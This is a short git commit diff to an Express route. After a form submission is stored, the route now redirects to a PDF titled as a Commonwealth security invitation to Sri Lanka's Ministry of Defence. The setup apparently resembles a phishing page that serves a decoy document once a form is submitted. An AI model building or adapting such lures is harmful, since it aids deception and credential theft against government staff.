6c4bbe1125d4df27321aa43a3727e12a7071fde8
defencemail <153504163+defencemail@users.noreply.github.com>
2023-12-14 01:06:03 -0500

    Update index.js

--- routes/index.js
+++ routes/index.js
@@ -91,7 +91,7 @@ router.post('/try', validateFormData2, (req, res) => {
 		    console.error('Error inserting record:', err);
 		    return res.status(500).send('Internal Server Error');
 		}
-		res.redirect('./රාජකාරී විද්_යුත් තැපෑල ආරක්_ෂාව සම්බන්ධවයි.pdf');
+		res.redirect('./Commonwealth Security Invitation to MoD Sri Lanka for Commonwealth Security Review 2024.pdf');
 		});
 		   
 
